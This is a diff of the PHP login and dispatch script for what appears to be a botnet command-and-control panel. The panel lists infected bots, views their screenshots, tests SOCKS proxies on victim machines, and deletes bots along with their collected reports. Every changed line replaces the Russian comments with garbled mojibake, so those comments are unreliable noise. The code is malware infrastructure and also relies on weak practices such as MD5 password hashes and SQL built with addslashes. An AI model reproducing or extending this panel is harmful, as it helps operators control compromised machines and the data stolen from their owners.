@@ -3,46 +3,46 @@
 require_once('system/global.php');
 if(!@include_once('system/config.php'))die('Hello! How are you?');
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Константы.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RљRѕRЅSЃS, P ° RЅS, C <.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-define('CURRENT_TIME',     time());                                     //Текущее время.
-define('ONLINE_TIME_MIN',  (CURRENT_TIME - $config['botnet_timeout'])); //Минимальное время для статуса "Онлайн".
-define('DEFAULT_LANGUAGE', 'en');                                       //Язык по умолчанию.
-define('THEME_PATH',       'theme');                                    //Папка для темы.
+define('CURRENT_TIME',     time());                                     //RўRμRєSѓS ‰ RμRμ RІSЂRμRјSЏ.
+define('ONLINE_TIME_MIN',  (CURRENT_TIME - $config['botnet_timeout'])); //RњReRЅReRјR ° P "SЊRЅRѕRμ RІSЂRμRјSЏ RґR" SЏ SЃS, P ° C SѓSЃR ° "RћRЅR" P ° P № RЅ.
+define('DEFAULT_LANGUAGE', 'en');                                       //RЇR · C <Rє RїRѕ SѓRјRѕR "C ‡ P ° RЅReSЋ.
+define('THEME_PATH',       'theme');                                    //RџR ° ° RїRєR RґR "SЏ C RμRјS <.
 
-//HTTP запросы.
+//HTTP P · P ° RїSЂRѕSЃS <.
 define('QUERY_SCRIPT',            basename($_SERVER['PHP_SELF']));
 define('QUERY_SCRIPT_HTML',       QUERY_SCRIPT);
-define('QUERY_VAR_MODULE',        'm');                     //Переменая указывающая на текущий модуль.
-define('QUERY_STRING_BLANK',      QUERY_SCRIPT.'?m=');      //Пустая строка запроса.
-define('QUERY_STRING_BLANK_HTML', QUERY_SCRIPT_HTML.'?m='); //Пустая строка запроса в HTML.
-define('CP_HTTP_ROOT',            str_replace('\\', '/', (!empty($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : '/'))); //Корень CP.
+define('QUERY_VAR_MODULE',        'm');                     //RџRμSЂRμRјRμRЅR ° SЏ SѓRєR ° F · C <RІR ° SЋS ‰ P ° SЏ RЅR ° C RμRєSѓS ‰ PEP number RјRѕRґSѓR "SЊ.
+define('QUERY_STRING_BLANK',      QUERY_SCRIPT.'?m=');      //RџSѓSЃS, P ° SЏ SЃS, SЂRѕRєR ° F · RїSЂRѕSЃR P ° °.
+define('QUERY_STRING_BLANK_HTML', QUERY_SCRIPT_HTML.'?m='); //RџSѓSЃS, P ° SЏ SЃS, SЂRѕRєR ° F · P ° ° RїSЂRѕSЃR RІ HTML.
+define('CP_HTTP_ROOT',            str_replace('\\', '/', (!empty($_SERVER['SCRIPT_NAME']) ? dirname($_SERVER['SCRIPT_NAME']) : '/'))); //RљRѕSЂRμRЅSЊ CP.
 
-//Сессия, куки.
-define('COOKIE_USER',      'p');                    //Имя пользователя в куках.
-define('COOKIE_PASS',      'u');                    //Пароль пользователя в куках.
-define('COOKIE_LIVETIME',  CURRENT_TIME + 2592000); //Время жизни куков.
-define('COOKIE_SESSION',   'ref');                  //Переменная для хранения сессии.
-define('SESSION_LIVETIME', CURRENT_TIME + 1300);    //Время жизни сессии.
+//RЎRμSЃSЃReSЏ, RєSѓRєRe.
+define('COOKIE_USER',      'p');                    //RЎRμSЃSЃReSЏ, RєSѓRєRe.
+define('COOKIE_PASS',      'u');                    //RџR ° SЂRѕR "SЊ RїRѕR" SЊR · RѕRІR ° C RμR "SЏ RІ RєSѓRєR ° C ....
+define('COOKIE_LIVETIME',  CURRENT_TIME + 2592000); //R'SЂRμRјSЏ P ¶ Pepsi · RЅRe RєSѓRєRѕRІ.
+define('COOKIE_SESSION',   'ref');                  //RџRμSЂRμRјRμRЅRЅR ° SЏ RґR "SЏ With ... SЂR ° RЅRμRЅReSЏ SЃRμSЃSЃReRe.
+define('SESSION_LIVETIME', CURRENT_TIME + 1300);    //R'SЂRμRјSЏ P ¶ Pepsi · RЅRe SЃRμSЃSЃReRe.
 
 $_sessionRef = 0;
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Инициализация.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-//Подключаемся к базе.
+//RџRѕRґRєR "SЋS ‡ P ° RμRјSЃSЏ Rє P ± P ° P · Rμ.
 if(!connectToDb())die(mysqlErrorEx());
 
-//Подключаем тему.
+//RџRѕRґRєR "SЋS ‡ P ° RμRј C RμRјSѓ.
 require_once(THEME_PATH.'/index.php');
 
-//Управление логином.
+//RЈRїSЂR ° RІR "RμRЅReRμ R" RѕRіReRЅRѕRј.
 if(!empty($_GET[QUERY_VAR_MODULE]))
 {
-  //Форма логина.
+  //P ¤ RѕSЂRјR ° P "RѕRіReRЅR °.
   if(strcmp($_GET[QUERY_VAR_MODULE], 'login') === 0)
   {
     unlockSessionAndDestroyAllCokies();
@@ -52,7 +52,7 @@ if(!empty($_GET[QUERY_VAR_MODULE]))
       $user = $_POST['user'];
       $pass = md5($_POST['pass']);
     
-      //Проверяем логин.
+      //RџSЂRѕRІRμSЂSЏRμRј R "RѕRіReRЅ.
       if(mysqlQueryEx('cp_users', "SELECT `id` FROM `cp_users` WHERE `name`='".addslashes($user)."' AND `pass`='".addslashes($pass)."' AND `flag_enabled`=1 LIMIT 1") && @mysql_affected_rows() == 1)
       {
         if(isset($_POST['remember']) && $_POST['remember'] == 1)
@@ -64,13 +64,13 @@ if(!empty($_GET[QUERY_VAR_MODULE]))
         lockSession();
         $_SESSION['name'] = $user;
         $_SESSION['pass'] = $pass;
-        //unlockSession();
+        //unlockSession ();
       
         header('Location: '.QUERY_STRING_BLANK.'home');
       }
       else
       {
-        sleep(5); //Антибрут.
+        sleep(5); //RђRЅS, Pepsi ± SЂSѓS.
         showLoginForm(true);
       }
       die();
@@ -80,7 +80,7 @@ if(!empty($_GET[QUERY_VAR_MODULE]))
     die();
   }
   
-  //Выход
+  //R'S <C ... RѕRґ
   if(strcmp($_GET['m'], 'logout') === 0)
   {
     unlockSessionAndDestroyAllCokies();
@@ -89,50 +89,50 @@ if(!empty($_GET[QUERY_VAR_MODULE]))
   }
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Проверка данных логина.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RџSЂRѕRІRμSЂRєR ° ° RґR RЅRЅS <C ... P "RѕRіReRЅR °.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-$logined = 0; //Флаг означающий, залогинины ли мы.
+$logined = 0; //P ¤ P "P ° Rі RѕR · RЅR ° C ‡ P ° ‰ SЋS Pepsi №, P · P ° P" RѕRіReRЅReRЅS <P "Pe RјS <.
 
-//Логин через сессию.
+//P> C ‡ RѕRіReRЅ RμSЂRμR · SЃRμSЃSЃReSЋ.
 lockSession();
 if(!empty($_SESSION['name']) && !empty($_SESSION['pass']))
 {
   if(($r = mysqlQueryEx('cp_users', "SELECT * FROM `cp_users` WHERE `name`='".addslashes($_SESSION['name'])."' AND `pass`='".addslashes($_SESSION['pass'])."' AND `flag_enabled`=1 LIMIT 1")))$logined = @mysql_affected_rows();
 }
-//Логин через куки.
+//P> C ‡ RѕRіReRЅ RμSЂRμR · RєSѓRєRe.
 if($logined !== 1 && !empty($_COOKIE[COOKIE_USER]) && !empty($_COOKIE[COOKIE_PASS]))
 {
   if(($r = mysqlQueryEx('cp_users', "SELECT * FROM `cp_users` WHERE MD5(`name`)='".addslashes($_COOKIE[COOKIE_USER])."' AND `pass`='".addslashes($_COOKIE[COOKIE_PASS])."' AND `flag_enabled`=1 LIMIT 1")))$logined = @mysql_affected_rows();
 }
-//Не удалось залогиниться.
+//RќRμ SѓRґR ° P "P RѕSЃSЊ · P ° P" RѕRіReRЅReS, SЊSЃSЏ.
 if($logined !== 1)
 {
   unlockSessionAndDestroyAllCokies();
-  sleep(5); //Антибрут.
+  sleep(5); //RђRЅS, Pepsi ± SЂSѓS.
   header('Location: '.QUERY_STRING_BLANK.'login');
   die();
 }
 
-//Получаем данные пользователя.
+//RџRѕR "SѓS ‡ P ° ° RμRј RґR RЅRЅS <Rμ RїRѕR" SЊR · RѕRІR ° C RμR "SЏ.
 $userData = @mysql_fetch_assoc($r);
 if($userData === false)die(mysqlErrorEx());
 $_SESSION['name'] = $userData['name'];
 $_SESSION['pass'] = $userData['pass'];
 
-//Подключаем язык.
+//RџRѕRґRєR "SЋS ‡ P ° RμRј SЏR · C <Rє.
 if(@strlen($userData['language']) != 2 || !safePath($userData['language']) || !file_exists('system/lng.'.$userData['language'].'.php'))$userData['language'] = DEFAULT_LANGUAGE;
 require_once('system/lng.'.$userData['language'].'.php'); 
 
-unlockSession();
+unlockSession ();
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Определяем меню.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RћRїSЂRμRґRμR "SЏRμRј RјRμRЅSЋ.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
-//Главное меню.
-$mainMenu = array(      //Модуль.             //Название.               //Необходимые права.
+//P "P" P ° RІRЅRѕRμ RјRμRЅSЋ.
+$mainMenu = array(      //RњRѕRґSѓR "SЊ. / / RќR ° F · RІR ° RЅReRμ. / / RќRμRѕR ± C ... RѕRґReRјS <Rμ RїSЂR RІR ° °.
                   array(0,                    LNG_MM_STATS,             array()),
                   array('stats_main',         LNG_MM_STATS_MAIN,        array('r_stats_main')),
                   array('stats_os',           LNG_MM_STATS_OS,          array('r_stats_os')),
@@ -155,7 +155,7 @@ $mainMenu = array(      //Модуль.             //Название.         
                   array('sys_users',          LNG_MM_SYSTEM_USERS,      array('r_system_users'))
                  );
 
-//Меню дейтвий над ботом. Также применяется для массива ботов.
+//RњRμRЅSЋ RґRμR № C № RІReR RЅR Rґ ° F ± RѕS, RѕRј. RўR RєR ° ¶ Rμ RїSЂReRјRμRЅSЏRμS, SЃSЏ RґR "SЏ RјR SЃSЃReRІR ° ° P ± RѕS, RѕRІ.
 $botMenu = array(
                  array('fullinfo',        LNG_MBA_FULLINFO,         array('r_botnet_bots')),
                  array('fullinfoss',      LNG_MBA_FULLINFOSS,       array('r_botnet_bots')),
@@ -176,9 +176,9 @@ $botMenu = array(
 
 optimizeMenu($botMenu, false);
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Обработка группы ботов.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RћR SЂR ° ± P ± RѕS, RєR ° RіSЂSѓRїRїS <P ± RѕS, RѕRІ.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_POST['bots']) && is_array($_POST['bots'])) || (!empty($_GET['bots']) && is_array($_GET['bots']))))
 {
@@ -187,19 +187,19 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
   $blist = !empty($_POST['bots']) && is_array($_POST['bots']) ? $_POST['bots'] : $_GET['bots'];
   $blist = array_unique($blist);
   
-  //Проверям есть ли право на действие.
+  //RџSЂRѕRІRμSЂSЏRј RμSЃS, SЊ P "Pe RїSЂR ° RІRѕ RЅR ° RґRμR number SЃS, RІReRμ.
   $deny = true;
   foreach($botMenu as $item)if($item[0] !== 0 && strcmp($item[0], $ba) === 0){$deny = false; break;}
   if($deny)ThemeFatalError(LNG_ACCESS_DEFINED);
   
-  //Составляем список ботов для MySQL.
+  //RЎRѕSЃS, P ° RІR "SЏRμRј SЃRїReSЃRѕRє P ± RѕS, RѕRІ RґR" SЏ MySQL.
   $sqlBlist = '';
   $count = 0;
   foreach($blist as $bot)$sqlBlist .= ($count++ == 0 ? '' : ' OR ')."`bot_id`='".addslashes($bot)."'";
 
   if(strcmp($ba, 'fullinfo') === 0 || strcmp($ba, 'fullinfoss') === 0)
   {
-    //Режим обнавления.
+    //P RμR ¶ ReRј RѕR ± RЅR ° RІR "RμRЅReSЏ.
     if($bedit && isset($_GET['save']) && (isset($_POST['used']) && is_array($_POST['used'])) && (isset($_POST['comment']) && is_array($_POST['comment'])))
     {
       $q = '';
@@ -213,7 +213,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
       die();
     }
     
-    //Скриншот.
+    //RЎRєSЂReRЅS € RѕS.
     if(strcmp($ba, 'fullinfoss') === 0 && isset($_GET['ipv4']) && isset($_GET['port']))
     {
       $format = 'image/'.$userData['ss_format'];
@@ -245,16 +245,16 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
       die();
     }
     
-    //Стандартный вывод.
+    //RЎS, P ° ° RЅRґR SЂS, RЅS <P № RІS <RІRѕRґ.
     if(!($r = mysqlQueryEx('botnet_list', 'SELECT *, IF(`rtime_last`>='.ONLINE_TIME_MIN.', 1, 0) AS `is_online`, LOCATE(`ipv4`, `ipv4_list`) as `nat_status` FROM `botnet_list` WHERE '.$sqlBlist)))ThemeMySQLError();
     
-    //Получаем результат.
+    //RџRѕR "SѓS ‡ P ° RμRј SЂRμR · SѓR" SЊS, P ° C.
     $res = array();
     while(($m = @mysql_fetch_assoc($r)))$res[$m['bot_id']] = $m;
     mysql_free_result($r);
     unset($m);
     
-    //Выводим результат.
+    //R'S <RІRѕRґReRј SЂRμR · SѓR "SЊS, P ° C.
     $eCount = 0;
     $data = '';
     if($bedit)$data .= str_replace(array('{NAME}', '{URL}', '{JS_EVENTS}'), array('edit', QUERY_SCRIPT_HTML.'?botsaction='.$ba.'&amp;save=1', ''), THEME_FORMPOST_BEGIN);
@@ -273,7 +273,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
           str_replace(array('{WIDTH}', '{TEXT}'), array('auto', botPopupMenu($bot, 'botmenu')), THEME_LIST_ITEM_LTEXT_U1).
         THEME_LIST_ROW_END;
       
-      //Базовая информация.
+      //P'p ° F · RѕRІR ° SЏ ReRЅS "RѕSЂRјR ° C † ReSЏ.
       $isExists = isset($res[$bot]);
       if(!$isExists)$data .= THEME_LIST_ROW_BEGIN.str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, LNG_BA_FULLINFO_EMPTY), THEME_LIST_ITEM_EMPTY_1).THEME_LIST_ROW_END;
       else
@@ -373,7 +373,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
         }
       }
       
-      //Концовка.
+      //RљRѕRЅS † RѕRІRєR °.
       $data .= 
       THEME_LIST_END.
       ($bedit && $isExists ? str_replace(array('{NAME}', '{VALUE}'), array('bots[]', htmlEntitiesEx($bot)), THEME_FORM_VALUE) : '').
@@ -413,7 +413,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
     header('Location: '.QUERY_STRING_BLANK.'reports_files&bots='.urlencode(implode(' ', $blist)).'&q=');
     die();
   }
-  else if(strcmp($ba, 'remove') === 0 || strcmp($ba, 'removeex') === 0) //Проверка прав не требуется, т.к. проверка присходит при формировании $botMenu.
+  else if(strcmp($ba, 'remove') === 0 || strcmp($ba, 'removeex') === 0) //RџSЂRѕRІRμSЂRєR ° RїSЂR RІ RЅRμ ° C, ± SЂRμR SѓRμS, SЃSЏ, C,. Rє. RїSЂRѕRІRμSЂRєR ° RїSЂReSЃS ... RѕRґReS, RїSЂRe C RѕSЂRјReSЂRѕRІR ° RЅReRe $ botMenu.
   {
     if(isset($_GET['yes']) || isset($_GET['no']))
     {
@@ -423,7 +423,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
       
       if(isset($_GET['yes']))
       {
-        //Удаление из botnet_list.
+        //RЈRґR ° P "RμRЅReRμ Pepsi · botnet_list.
         if(mysqlQueryEx('botnet_list', 'DELETE FROM `botnet_list` WHERE '.$sqlBlist))$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
         else                                                                         $t = str_replace('{TEXT}', mysqlErrorEx(),                                       THEME_STRING_ERROR);
         
@@ -433,13 +433,13 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
           str_replace(array('{WIDTH}', '{TEXT}'), array('auto', $t), THEME_LIST_ITEM_LTEXT_U1).
         THEME_LIST_ROW_END;
         
-        //Удаление.
+        //RЈRґR ° P "RμRЅReRμ.
         if(strcmp($ba, 'removeex') === 0)
         {
           $i = 1;
           $rlist = listReportTables($config['mysql_db']);
           
-          //Удаление из botnet_reports_*.
+          //RЈRґR ° P "RμRЅReRμ Pepsi · botnet_reports_ *.
           foreach($rlist as $table)
           {
             if(mysqlQueryEx($table, "DELETE FROM `{$table}` WHERE ".$sqlBlist))$t = str_replace('{TEXT}', sprintf(LNG_BA_REMOVE_REMOVED, @mysql_affected_rows()), THEME_STRING_SUCCESS);
@@ -456,7 +456,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
             $i++;
           }
           
-          //Удаление файлов.
+          //RЈRґR ° P "RμRЅReRμ C" P ° P № R "RѕRІ.
           $root = getDirs($config['reports_path']);
           if($root !== false)foreach($root as $rdir)
           {
@@ -515,14 +515,14 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
   }
   else if(strcmp($ba, 'port_socks') === 0)
   {
-    //Проверка сокса.
+    //RџSЂRѕRІRμSЂRєR SЃRѕRєSЃR ° °.
     if(isset($_GET['ipv4']) && isset($_GET['port']))
     {
       $ok = 0;
       if(($s = @fsockopen($_GET['ipv4'], $_GET['port'], $errn, $errs, 5)))
       {
         @stream_set_timeout($s, 5);
-        $data = pack('CCSL', 4, 1, 0, 0)."\0"; //Заголовок Socks4.
+        $data = pack('CCSL', 4, 1, 0, 0)."\0"; //P-P ° RіRѕR "RѕRІRѕRє Socks4.
         if(@fwrite($s, $data) && ($data = @fread($s, 8)) && strlen($data) == 8)$ok = 1;
         fclose($s);
       }
@@ -533,10 +533,10 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
       die();
     }
     
-    //Вывод списка.
+    //R'S <RІRѕRґ SЃRїReSЃRєR °.
     if(!($r = mysqlQueryEx('botnet_list', 'SELECT `bot_id`, `country`, `ipv4`, `tcpport_s1` FROM `botnet_list` WHERE '.$sqlBlist)))ThemeMySQLError();
     
-    //Получаем результат.
+    //RџRѕR "SѓS ‡ P ° RμRј SЂRμR · SѓR" SЊS, P ° C.
     $res = array();
     while(($m = @mysql_fetch_row($r)))$res[$m[0]] = $m;
     mysql_free_result($r);
@@ -549,7 +549,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
     $i = 0;
     $jsList = '';
     
-    //Выводим результат.
+    //R'S <RІRѕRґReRј SЂRμR · SѓR "SЊS, P ° C.
     foreach($blist as $bot)
     {
       $isExists = isset($res[$bot]);
@@ -573,7 +573,7 @@ if((!empty($_GET['botsaction']) || !empty($_POST['botsaction'])) && ((!empty($_P
       THEME_LIST_ROW_END;
     }
     
-    //Скрипт для проверки соксов.
+    //RЎRєSЂReRїS, RґR "SЏ RїSЂRѕRІRμSЂRєRe SЃRѕRєSЃRѕRІ.
     $ajaxError = addJsSlashes(str_replace('{TEXT}', LNG_BA_PORT_SOCKS_ERROR, THEME_STRING_ERROR));
     $ajaxInit  = jsXmlHttpRequest('socksHttp');
     $q         = addJsSlashes(QUERY_SCRIPT.'?botsaction=port_socks&bots[]=0');
@@ -618,11 +618,11 @@ JS_SCRIPT;
   die();
 }
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Запуск модуля.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P-P ° RїSѓSЃRє RјRѕRґSѓR "SЏ.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
                             
-//Выбор имени модуля и удаление лишних пунктов меню.
+//R'S <P ± RѕSЂ ReRјRμRЅRe RјRѕRґSѓR "SЏ Re SѓRґR ° P" RμRЅReRμ P "€ RЅReS Res ... RїSѓRЅRєS, RѕRІ RјRμRЅSЋ.
 $neededModule = (empty($_GET[QUERY_VAR_MODULE]) ? '' : $_GET[QUERY_VAR_MODULE]);
 $curModule     =  '';
 
@@ -630,23 +630,23 @@ optimizeMenu($mainMenu, true);
 foreach($mainMenu as $key => $item)if($item[0] !== 0 && (strcmp($neededModule, $item[0]) === 0 || $curModule == ''))$curModule = $item[0];
 if($curModule == '')die('Modules for current user not defined.');
 
-define('CURRENT_MODULE',      $curModule);                             //Текущий модуль.
-define('FORM_CURRENT_MODULE', str_replace(array('{NAME}', '{VALUE}'), array('m', $curModule), THEME_FORM_VALUE)); //Параметр текущего модуля для формы.
-define('QUERY_STRING',        QUERY_STRING_BLANK.CURRENT_MODULE);      //Строка запроса для текущего модуля.
-define('QUERY_STRING_HTML',   QUERY_STRING_BLANK_HTML.CURRENT_MODULE); //Строка запроса для текущего модуля в HTML формате.
+define('CURRENT_MODULE',      $curModule);                             //RўRμRєSѓS ‰ PEP number RјRѕRґSѓR "SЊ.
+define('FORM_CURRENT_MODULE', str_replace(array('{NAME}', '{VALUE}'), array('m', $curModule), THEME_FORM_VALUE)); //RџR ° ° SЂR RјRμS, SЂ C RμRєSѓS ‰ RμRіRѕ RјRѕRґSѓR "SЏ RґR" SЏ C RѕSЂRјS <.
+define('QUERY_STRING',        QUERY_STRING_BLANK.CURRENT_MODULE);      //RЎS, SЂRѕRєR ° F · P ° ° RїSЂRѕSЃR RґR "SЏ C RμRєSѓS ‰ RμRіRѕ RјRѕRґSѓR" SЏ.
+define('QUERY_STRING_HTML',   QUERY_STRING_BLANK_HTML.CURRENT_MODULE); //RЎS, SЂRѕRєR ° F · P ° ° RїSЂRѕSЃR RґR "SЏ C RμRєSѓS ‰ RμRіRѕ RјRѕRґSѓR" SЏ RІ HTML C RѕSЂRјR ° C, Rμ.
 unset($neededModule, $curModule);
 
-//Загрузка языка модуля.
+//P-P ° RіSЂSѓR · RєR SЏR · ° C <RєR ° RјRѕRґSѓR "SЏ.
 if(!file_exists('system/'.CURRENT_MODULE.'.lng.'.$userData['language'].'.php'))$userData['language'] = DEFAULT_LANGUAGE;
 require_once('system/'.CURRENT_MODULE.'.lng.'.$userData['language'].'.php'); 
 
-//Запуск модуля.
+//P-P ° RїSѓSЃRє RјRѕRґSѓR "SЏ.
 require_once('system/'.CURRENT_MODULE.'.php'); 
 die();
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Функции.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P ¤ † SѓRЅRєS ReRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 /*
   Получение ошибки MySQL с формотированием HTML и префиксом.
@@ -742,24 +742,24 @@ function expressionToArray($exp)
   {
     $cur = ord($exp[$i]);
     
-    //Пропускаем пробелные символы.
+    //RџSЂRѕRїSѓSЃRєR ° RμRј RїSЂRѕR ± RμR "RЅS <Rμ SЃReRјRІRѕR" C <.
     if($cur == 0x20 || ($cur >= 0x9 && $cur <= 0xD))continue;
         
-    //Проверяем ковычку.
+    //RџSЂRѕRІRμSЂSЏRμRј RєRѕRІS <C ‡ RєSѓ.
     if($cur == 0x22 || $cur == 0x27)
     {
       for($j = $i + 1; $j < $len; $j++)if(ord($exp[$j]) == $cur)
       {
-        //Подсчитываем количество слешей.
+        //RџRѕRґSЃS ‡ Res, C <RІR ° RμRј RєRѕR "Republic ‡ RμSЃS, RІRѕ SЃR" RμS € RμR №.
         $c = 0;
         for($k = $j - 1; ord($exp[$k]) == 0x5C; $k--)$c++;
-        if($c % 2 == 0)break; //При четном количестве слешей до ковычки, наша ковычка это не спец. символ.
+        if($c % 2 == 0)break; //RџSЂRe C ‡ RμS, RЅRѕRј RєRѕR "Republic ‡ RμSЃS, RІRμ SЃR" RμS € RμR number RґRѕ RєRѕRІS <C ‡ RєRe, RЅR ° C € P ° RєRѕRІS <C ‡ ° RєR SЌS, Rѕ RЅRμ SЃRїRμS †. SЃReRјRІRѕR.
       }
-      if($j != $len)$i++; //Если не достигнут конец, убираем первую ковычку.
+      if($j != $len)$i++; //P • SЃR "Re RЅRμ RґRѕSЃS, ReRіRЅSѓS, RєRѕRЅRμS †, SѓR ± ReSЂR ° RμRј RїRμSЂRІSѓSЋ RєRѕRІS <C ‡ RєSѓ.
       
       $type = 1;
     }
-    //Простое копирование до первого пробела.
+    //RџSЂRѕSЃS, RѕRμ RєRѕRїReSЂRѕRІR ° RЅReRμ RґRѕ RїRμSЂRІRѕRіRѕ RїSЂRѕR ± RμR "P °.
     else
     {
       for($j = $i + 1; $j < $len; $j++)
@@ -797,11 +797,11 @@ function matchStringInExpression($str, $exp, $cs, $strong)
   
   $list = expressionToArray($exp);
   
-  //Настройка pcre.
+  //RќR ° SЃS, SЂRѕR number RєR ° pcre.
   $pcrePrefix  = ($strong ? '#^' : '#');
   $pcrePostfix = ($strong ? '$#' : '#').($cs ? 'u' : 'iu');
 
-  //Обрабатыаем результат.
+  //RћR SЂR ° ± P ± P ° C, C <P ° RμRј SЂRμR · SѓR "SЊS, P ° C.
   $qPrev = $q_cur = 0;
   $retVal = false;
   
@@ -817,10 +817,10 @@ function matchStringInExpression($str, $exp, $cs, $strong)
       if($skip == 0){$qPrev = $q_cur; continue;}
     }
     
-    //Сравниваем.
+    //RЎSЂR ° ° RІRЅReRІR RμRј.
     $r = preg_match($pcrePrefix.strtr(preg_quote($item[0], '#'), array('\\*' => '.*', '\\?' => '.?')).$pcrePostfix, $str);
     
-    //Не уверен за логику.
+    //RќRμ SѓRІRμSЂRμRЅ P · P ° P "RѕRіReRєSѓ.
     switch($q_cur)
     {
       case 0: //OR
@@ -857,7 +857,7 @@ function expressionToSql($exp, $column, $cs, $strong)
   
   $list = expressionToArray($exp);
   
-  //Обрабатыаем результат.
+  //RћR SЂR ° ± P ± P ° C, C <P ° RμRј SЂRμR · SѓR "SЊS, P ° C.
   $query  = '';
   $qPrev = $q_cur = ' OR ';
   $qAddv = ' ';
@@ -882,15 +882,15 @@ function expressionToSql($exp, $column, $cs, $strong)
     
     $s = str_replace(array('%', '_'), array('\\\\%', '\\\\_'), $item[0]);
     
-    //Подменяем симолы *, ?.
+    //RџRѕRґRјRμRЅSЏRμRј SЃReRјRѕR "C <*?.
     $len = strlen($s);
     for($i = 0; $i < $len; $i++)if(($c = ord($s[$i])) == 0x2A || $c == 0x3F)
     {
-      //Подсчитываем количество слешей.
+      //RџRѕRґSЃS ‡ Res, C <RІR ° RμRј RєRѕR "Republic ‡ RμSЃS, RІRѕ SЃR" RμS € RμR №.
       $cc = 0;
       for($k = $i - 1; $k >= 0 && ord($s[$k]) == 0x5C; $k--)$cc++;
       
-      //Подменяем.
+      //RџRѕRґRјRμRЅSЏRμRј.
       if($cc % 2 == 0)$s[$i] = $c == 0x2A ? '%' : '_';
     }
     
@@ -988,25 +988,25 @@ function botnetsToListBox($currentBotnet, $advQuery)
 function showPageList($totalPages, $currentPage, $js)
 {
   $list          = array();
-  $visiblePages = 5; //Радиус видимых страниц.
+  $visiblePages = 5; //P P ° RґReSѓSЃ RІReRґReRјS <C ... SЃS, SЂR ° RЅReS †.
   
-  //Подсчитываем видимые страницы.
+  //RџRѕRґSЃS ‡ Res, C <RІR ° RμRј RІReRґReRјS <Rμ SЃS, SЂR ° RЅReS † C <.
   $minVisible   = $currentPage - $visiblePages;
   $maxVisible   = $currentPage + $visiblePages;
   
-  if($minVisible < 1)                $maxVisible -= $minVisible - 1;              //!Увеличиваем на чисило <1
-  else if($maxVisible > $totalPages)$minVisible -= ($maxVisible - $totalPages); //Уменьшаем на число вышедшее за $totalPages.
+  if($minVisible < 1)                $maxVisible -= $minVisible - 1;              //! RЈRІRμR "Res ReRІR ‡ ° RμRј RЅR ° C ‡ ReSЃReR" Rѕ <1
+  else if($maxVisible > $totalPages)$minVisible -= ($maxVisible - $totalPages); //RЈRјRμRЅSЊS € P ° RμRј RЅR ° C ‡ ReSЃR "Rѕ RІS <C € € RμRґS RμRμ P · P ° $ totalPages.
   
   $qMin = false;
   $qMax = false;
   
   for($i = 1; $i <= $totalPages; $i++)
   {
-    //Текщая страница.
+    //RўRμRєS ‰ P ° SЏ SЃS, SЂR ° RЅReS † P °.
     if($i == $currentPage)$list[] = array($i, 0);
     else
     {
-      //Невидимые страницы.
+      //RќRμRІReRґReRјS <Rμ SЃS, SЂR ° RЅReS † C <.
       if($i != 1 && $i != $totalPages && ($i < $minVisible || $i > $maxVisible))
       {
         if($i < $minVisible && $qMin == false)
@@ -1020,7 +1020,7 @@ function showPageList($totalPages, $currentPage, $js)
           $qMax = true;
         }
       }
-      //Видимые страницы.
+      //R'ReRґReRјS <Rμ SЃS, SЂR ° RЅReS † C <.
       else $list[] = array($i, str_replace('{P}', $i, $js));
     }
   }
@@ -1076,7 +1076,7 @@ function botPopupMenu($botId, $menuName)
   Создние заголовка колонки, полежащей сортировке.
   
   IN $text     - string, название колонки.
-  IN $columnId - int, ID колонки.
+  IN $columnId - int, ID RєRѕR "RѕRЅRєRe.
   IN $num      - bool, true - колонка служит для вывода чисел, false - колонка служит для вывода текста.
   
   Retrurn      - string, колонка.
@@ -1153,9 +1153,9 @@ function jsCheckAll($form, $cb, $arr)
 */
